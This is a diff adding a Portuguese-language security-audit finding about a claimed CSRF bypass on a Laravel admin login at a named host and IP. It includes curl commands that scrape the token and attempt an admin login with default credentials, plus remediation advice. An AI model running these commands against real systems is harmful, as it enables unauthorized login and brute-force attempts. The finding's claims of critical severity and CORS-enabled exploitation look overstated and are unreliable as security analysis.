@@ -1,0 +1,48 @@
+# F-103 CSRF Protection Bypass via X-CSRF-TOKEN Header
+Alvo: ifes25-semproxy.selecao.net.br (64.31.24.186)
+Severidade: Crítica
+Timestamp: 2026-08-25T18:01:00Z
+
+## Descrição
+O Laravel admin login aceita o header X-CSRF-TOKEN como substituto do campo _token no body do formulário. Requisições com X-CSRF-TOKEN válido processam o login sem CSRF token no body. Isso significa que um site malicioso pode fazer login requests em nome do usuário, desde que obtenha um CSRF token válido via GET request.
+
+Combinado com CORS (F-102), um atacante pode:
+1. Visitar a página de login do admin via fetch de um site malicioso
+2. Extrair o CSRF token da resposta
+3. Fazer login requests com credenciais conhecidas
+
+## Reprodução
+Requisição SEM X-CSRF-TOKEN header (falha - 419):
+```bash
+curl -sk -X POST https://ifes25-semproxy.selecao.net.br/admin/login/ \
+  -d "_token=TOKEN&email=admin@admin.com&password=admin"
+# HTTP 419 - CSRF token mismatch
+```
+
+Requisição COM X-CSRF-TOKEN header (aceita - 302/422):
+```bash
+# Obter CSRF token
+PAGE=$(curl -sk -c cookies.txt https://ifes25-semproxy.selecao.net.br/admin/login/)
+CSRF=$(echo "$PAGE" | grep -oP '_token" value="\K[a-zA-Z0-9]+')
+
+# Login com X-CSRF-TOKEN header (body token removido)
+curl -sk -X POST https://ifes25-semproxy.selecao.net.br/admin/login/ \
+  -H "X-CSRF-TOKEN: $CSRF" \
+  -b cookies.txt \
+  -d "email=admin@admin.com&password=admin"
+# HTTP 302 (redirect to admin/login - credenciais inválidas, mas CSRF bypassed)
+```
+
+Requisição SEM body token, APENAS header X-CSRF-TOKEN -> HTTP 302 (aceito)
+Requisição SEM header, COM body token inválido -> HTTP 419 (rejeitado)
+
+## Impacto
+Permite CSRF completo combinado com CORS wildcard. Um atacante pode:
+- Forjar requests de login em nome de admins logados
+- Potencialmente sequestrar sessões administrativas
+- Fazer força bruta sem ser bloqueado por CSRF
+
+## Recomendação
+- Validar CSRF token em BOTH body E header
+- Remover Access-Control-Allow-Origin: *
+- Implementar SameSite cookies
